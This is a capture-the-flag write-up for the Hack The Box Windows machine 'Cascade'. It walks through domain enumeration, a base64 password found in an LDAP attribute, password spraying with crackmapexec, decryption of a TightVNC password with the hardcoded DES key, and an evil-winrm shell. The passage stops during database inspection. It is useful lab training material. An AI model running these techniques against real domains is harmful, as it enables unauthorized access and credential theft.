---
title: "Cascade"
difficulty: Medium
os: Windows
points: 30
rating: 4.6
date: 2020-03-28
avatar: assets/htb/cascade.png
htb_url: https://app.hackthebox.com/machines/Cascade
---

## Overview

This medium Windows box revisited several ideas and techniques I had already met on other targets \(like [Nest](nest-write-up.md)\), while also throwing in some fresh material that kept it genuinely entertaining. Thorough enumeration makes it a reasonably approachable challenge, though how easy it feels depends on your comfort with certain parts \(reading C\# source, for example\).

## Useful Skills and Tools

### **Enumerate SMB shares without credentials**

`smbclient -N -L \\\\<server_IP>\\`

or

`smbmap -d <domain> -L -H <IP>`

### **Copying an entire SMB folder recursively using smbclient:**

> 1. Connect using: `smbclient -U <user> \\\\<ip>\\<folder> <password>`
> 2. smb: `tarmode` 
> 3. smb: `recurse` 
> 4. smb: `prompt` 
> 5. smb: `mget <folder_to_copy>`

### **Decode VNC Passwords**

A lot of VNC products reuse the same hardcoded DES key to protect stored passwords, so recovering them is trivial.

```ruby
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["<encrypted_password>"].pack('H*'), fixedkey
=> "[decoded_output]"
```

### **Compile .NET code online**

If you want to compile and run .NET code quickly without setting up Visual Studio and all its dependencies, the site [`https://dotnetfiddle.net/`](https://dotnetfiddle.net/) is well worth using.

### **Disassemble .NET binaries**

Binaries produced by .NET languages \(C\#, for instance\) can be decompiled back to something close to their original source quite easily using [`https://github.com/icsharpcode/AvaloniaILSpy`](https://github.com/icsharpcode/AvaloniaILSpy).

## Enumeration

#### **Nmap scan**

My enumeration began with an nmap scan against `<YOUR_IP>`. The flags I typically reach for are: `-p-`, a shorthand telling nmap to cover every port, `-sC`, which is the same as `--script=default` and fires off nmap's default enumeration scripts at the host, `-sV` for service detection, and `-oN <name>` to write the results to a file called `<name>`.

The scan initially refused to run until I tacked on `-Pn` so nmap would skip its ICMP probes. With that in place it completed without issue.

```text
kac0@kalimaa:~/htb/cascade$ nmap -p- -sC -sV -Pn -oN cascade.nmap <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 18:46 EDT
Nmap scan report for <YOUR_IP>
Host is up (0.050s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-24 22:52:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m12s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-24T22:53:48
|_  start_date: 2020-06-24T17:39:31

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 322.04 seconds
```

nmap's OS detection pegged the host as `windows_server_2008:r2:sp1`, a fairly dated Windows release! Beyond that, the open ports were the usual set you'd expect on a Windows Domain Controller.

#### **rpcclient**

Next I used `rpcclient` to connect to the RPC service.

```text
rpcclient -U "" -N <YOUR_IP>

rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

There wasn't much to extract, but I did pull a list of usernames \(along with their RIDs\).

#### **Metasploit - Kerberos user enumeration**

I dropped the usernames into a file and ran Metasploit's `auxiliary(gather/kerberos_enumusers)` module to confirm which were valid accounts and to find out whether any of them lacked the pre-authentication requirement.

```text
msf5 auxiliary(gather/kerberos_enumusers) > run
[*] Running module against <YOUR_IP>

[*] Validating options...
[*] Using domain: CASCADE.LOCAL...
[*] <YOUR_IP>:88 - Testing User: "cascguest"...
[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] <YOUR_IP>:88 - User: "cascguest" account disabled or locked out
[*] <YOUR_IP>:88 - Testing User: "arksvc"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "arksvc" is present
[*] <YOUR_IP>:88 - Testing User: "s.smith"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "s.smith" is present
[*] <YOUR_IP>:88 - Testing User: "r.thompson"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "r.thompson" is present
[*] <YOUR_IP>:88 - Testing User: "util"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "util" is present
[*] <YOUR_IP>:88 - Testing User: "j.wakefield"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "j.wakefield" is present
[*] <YOUR_IP>:88 - Testing User: "s.hickson"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "s.hickson" is present
[*] <YOUR_IP>:88 - Testing User: "j.goodhand"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "j.goodhand" is present
[*] <YOUR_IP>:88 - Testing User: "a.turnbull"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "a.turnbull" is present
[*] <YOUR_IP>:88 - Testing User: "e.crowe"...
[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] <YOUR_IP>:88 - User: "e.crowe" account disabled or locked out
[*] <YOUR_IP>:88 - Testing User: "b.hanson"...
[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] <YOUR_IP>:88 - User: "b.hanson" account disabled or locked out
[*] <YOUR_IP>:88 - Testing User: "d.burman"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "d.burman" is present
[*] <YOUR_IP>:88 - Testing User: "backupsvc"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "backupsvc" is present
[*] <YOUR_IP>:88 - Testing User: "j.allen"...
[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] <YOUR_IP>:88 - User: "j.allen" is present
[*] <YOUR_IP>:88 - Testing User: "i.croft"...
[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
[-] <YOUR_IP>:88 - User: "i.croft" account disabled or locked out
[*] Auxiliary module execution completed
```

Interesting results. A handful of the accounts had been revoked and were either disabled or locked out, and I hoped that wasn't because someone had been brute-forcing logins! Sadly, every active account still demanded pre-authentication.

#### **enum4linux**

In parallel with the previous commands, I had `enum4linux` going in a separate terminal. The script automates many of the typical Windows enumeration steps, though it can be slow to finish.

```text
[+] Getting builtin group memberships:
Group 'Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group 'Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group 'Users' (RID: 545) has member: CASCADE\Domain Users
Group 'Guests' (RID: 546) has member: CASCADE\CascGuest
Group 'Guests' (RID: 546) has member: CASCADE\Domain Guests
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
Group 'Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[IT] rid:[0x459]
group:[Production] rid:[0x45a]
group:[HR] rid:[0x45b]
group:[AD Recycle Bin] rid:[0x45f]
group:[Backup] rid:[0x460]
group:[Temps] rid:[0x463]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
group:[Factory] rid:[0x46c]
group:[Finance] rid:[0x46d]
group:[Audit Share] rid:[0x471]
group:[Data Share] rid:[0x472]

[+] Getting local group memberships:
Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users
Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners
Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers
Group 'IT' (RID: 1113) has member: CASCADE\arksvc
Group 'IT' (RID: 1113) has member: CASCADE\s.smith
Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith
Group 'HR' (RID: 1115) has member: CASCADE\s.hickson
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]
```

Much of what it produced overlapped with what tools like `ldapsearch` would have given me, but it gathered everything in one place and broke it out tidily by category. Handy as the tool is, I wouldn't rely on it alone, since it strips away plenty of fields that can occasionally hold something useful.

The most valuable takeaway here was the group membership of each user.

* `IT` group contains: **r.thompson**, **s.smith**, and **arksvc**.
* `HR` group contains: **s.hickson** 
* `AD Recycle Bin` group contains: **arksvc** 
* `Remote Management Users` group contains **s.smith** and **arksvc**
* `Audit Share` group contains **s.smith**
* `Data Share` group contains all **Domain Users**

#### **smbclient**

A couple of the noteworthy group names hinted at the existence of `Data` and `Audit` share folders.

```text
kac0@kalimaa:~/htb/cascade$ smbclient -N \\\\<YOUR_IP>\\Data
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

I attempted an anonymous connection to each folder to see what was there. The login itself succeeded, but the ACL blocked me from reaching the folders. Strange!

#### ldapsearch

Having gathered plenty of useful data but still no credentials, I decided to dig further into LDAP to see whether the other tools had overlooked anything.  \(I'd even tried feeding the username list back in as passwords to catch that common mistake, but that went nowhere\).  

```text
# Remote Management Users, Groups, UK, cascade.local
dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: group
cn: Remote Management Users
member: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
member: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
distinguishedName: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=lo
 cal
instanceType: 4
whenCreated: 20200113032705.0Z
whenChanged: 20200117213541.0Z
uSNCreated: 94253
uSNChanged: 127173
name: Remote Management Users
objectGUID:: mcLF5nZ80kCiOcrXdXFmjA==
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZgQAAA==
sAMAccountName: Remote Management Users
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117213546.0Z
dSCorePropagationData: 20200117213257.0Z
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 16010714223232.0Z

SHARES:
\\Casc-DC1\Audit$
\\Casc-DC1\Data

# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200624203207.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 319688
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132375043274134331
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

A few minor details turned up here that the other tools had missed, including the precise share folder names.  Easy to skip past, the `r.thompson` entry also carried what looked like a password in its **cascadeLegacyPwd** field .

```text
kac0@kalimaa:~/htb/cascade$ echo clk0bjVldmE= | base64 -d
rY4n5eva
```

Base64-decoding `clk0bjVldmE=` produced the password `rY4n5eva`. 

#### crackmapexec

I added this password to my **passwords** file and ran `crackmapexec` to spray it against every user over SMB.  

```text
kac0@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade <YOUR_IP>

Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)

SMB         <YOUR_IP>    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [+] Cascade\r.thompson:rY4n5eva
```

As anticipated, the password was `r.thompson`'s. 

## Initial Foothold

### Enumeration as `r.thompson`

#### smbmap

With the freshly obtained credentials I could enumerate the full set of network shares on the box.

```text
kac0@kalimaa:~/htb/cascade$ smbmap -H <YOUR_IP> -u r.thompson -p rY4n5eva
[+] IP: <YOUR_IP>:445        Name: Casc-DC1                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

This account's reach was limited to **Data**, **NETLOGON**, **print$**, and **SYSVOL**.  

#### smbclient

I looked at **SYSVOL** first, as it occasionally holds passwords, but neither it nor **NETLOGON** had anything of value.  The **print$** admin share held nothing but printer drivers, and I wasn't about to go chasing driver exploits before I'd run out of other enumeration paths.

```text
kac0@kalimaa:~/htb/cascade$ smbclient -U r.thompson -W Cascade \\\\<YOUR_IP>\\data rY4n5eva
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                13106687 blocks of size 4096. 7794950 blocks available
```

## Road to User

Connecting to the Data share revealed folders matching each of the business-unit security groups I'd noted before. Given that `r.thompson` belongs to the `IT` group, I guessed that was the folder he could reach.  \(I confirmed by trying the others; access denied\).

```text
smb: \> ls IT\
  .                                   D        0  Tue Jan 28 13:04:51 2020
  ..                                  D        0  Tue Jan 28 13:04:51 2020
  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
  Logs                                D        0  Tue Jan 28 19:53:04 2020
  Temp                                D        0  Tue Jan 28 17:06:59 2020

                13106687 blocks of size 4096. 7795046 blocks available
smb: \> tarmode
tar:311  tarmode is now full, system, hidden, noreset, quiet
smb: \> recurse
smb: \> prompt
smb: \> mget *
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (6.9 KiloBytes/sec) (average 9.0 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (28.3 KiloBytes/sec) (average 15.4 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (13.8 KiloBytes/sec) (average 15.0 KiloBytes/sec)
```

I leaned on a small trick picked up from the [`Nest`](nest-write-up.md) box to pull every file in an SMB folder recursively.  Once the download finished, I went through my haul.

![](assets/wu/cascade/img-1.png)

Inside `Meeting_Notes_June_2018.html` I spotted another candidate username, `TempAdmin`.  That account was assigned the same password as the regular admin account, so cracking one would hand me both!

```text
/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

The `ArkAdRecycleBin.log` file caught my eye. If I managed to authenticate as `arksvc`, it seemed plausible I'd hold **SeBackupPrivilege**, which would be close to an instant win. That service account is also in the `Remote Management Users` group, which made this look like a promising avenue to pursue.

### **Finding user creds**

The final file I opened looked the most promising. Registry exports frequently hide interesting things. 

```text
kac0@kalimaa:~/htb/cascade/IT/Temp/s.smith$ cat VNC\ Install.reg 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

The moment I saw `VNC Install.reg` I was confident a password would be inside, and sure enough it was.  The password sat there encrypted and encoded as hex, but **`frizb`** maintains a GitHub repo explaining how to decrypt it at [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts).

> VNC relies on a hardcoded DES key to store credentials, and the very same key turns up across multiple product lines.

```ruby
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
=> "sT333ve2"
```

**`frizb`** notes a simple way to decode it through Metasploit's interactive Ruby prompt.  Feeding in the "industry standard" decryption key `\x17\x52\x6b\x06\x23\x4e\x58\x07` recovered the password `sT333ve2`.

```text
kac0@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade <YOUR_IP>
SMB         <YOUR_IP>    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         <YOUR_IP>    445    CASC-DC1         [+] Cascade\s.smith:sT333ve2
```

### **User.txt**

```text
kac0@kalimaa:~/htb/cascade$ evil-winrm -u s.smith -p sT333ve2 -i <YOUR_IP>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Neither the groups nor the privileges held any surprises for `s.smith`.  Still, I was glad to find `user.txt` waiting in the Desktop folder!

```text
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
f29a************************b507
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `s.smith`

#### smbmap

I went back to `smbmap` to check what access this user had to the **Audit$** share, since I had no idea where it lived in the filesystem.  

```text
kac0@kalimaa:~/htb/cascade$ smbmap -H <YOUR_IP> -u s.smith -p sT333ve2
[+] IP: <YOUR_IP>:445        Name: Casc-DC1                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

`s.smith` had only Read access to the **Data** and **Audit** shares, plus **print$**, **NETLOGON**, and **SYSVOL**

```text
kac0@kalimaa:~/htb/cascade$ smbclient -U s.smith -W Cascade \\\\<YOUR_IP>\\Audit$
Enter CASCADE\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                       A    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                13106687 blocks of size 4096. 7794884 blocks available
```

Having already gone through the other shares, I connected to the **audit$** share.  The first file I opened, `RunAudit.bat`, held just a single line.

```text
*Evil-WinRM* PS C:\shares\audit> more RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

It appeared that running the batch script invokes the `CascAudit.exe` executable against the `Audit.db` database file. I pulled the database down and ran `sqlite3 Auditdb`, dropping me into a SQLite shell where I could explore the database.

```sql
kac0@kalimaa:~/htb/cascade$ sqlite3 Audit.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .databases
main: /home/kac0/htb/cascade/Audit.db
